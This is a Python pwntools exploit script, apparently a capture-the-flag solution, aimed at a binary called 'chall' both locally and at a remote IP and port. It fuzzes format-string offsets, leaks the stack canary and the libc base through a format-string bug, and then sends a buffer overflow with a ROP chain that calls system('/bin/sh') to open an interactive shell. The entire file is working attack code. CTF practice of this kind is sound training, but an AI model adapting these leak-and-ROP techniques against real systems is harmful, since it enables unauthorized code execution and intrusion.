from pwn import *
import time

context.binary = elf = ELF("./chall")
context.terminal = ['xfce4-terminal', '-e']
context.log_level = 'error'
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
	p = gdb.debug([elf.path],'''
            b prinf
            continue
        ''')

elif len(sys.argv) > 1 and sys.argv[1] == 'fuz':
    for i in range(150):
        p = process()
        p.sendlineafter(b'key!!):',f'AAAABBBB.%{i}$f'.encode())
        a = p.recvline()
        print(i,a)
        p.close()

elif len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote('103.87.66.171',61006)

else:
    p = process()


p.sendlineafter(b'key!!):',f'%25$f||%27$f'.encode())
p.recvuntil(b'is: ')
a = p.recv().strip().split(b'\n')[0]
leak = a.split(b'||')
print(leak)

libc.address = eval(leak[1]) - 0xcd38 - 0x1d030
print(hex(libc.address))
canary = int(leak[0],16)
print(hex(canary))

offset = 136
payload  = b"A" * offset
payload += p64(canary)
payload += b"B" * 8

rop = ROP(libc)
rop.raw(rop.ret.address)
rop.call('system', [next(libc.search(b'/bin/sh\0'))])

payload += rop.chain()
p.sendline(payload)

p.interactive()
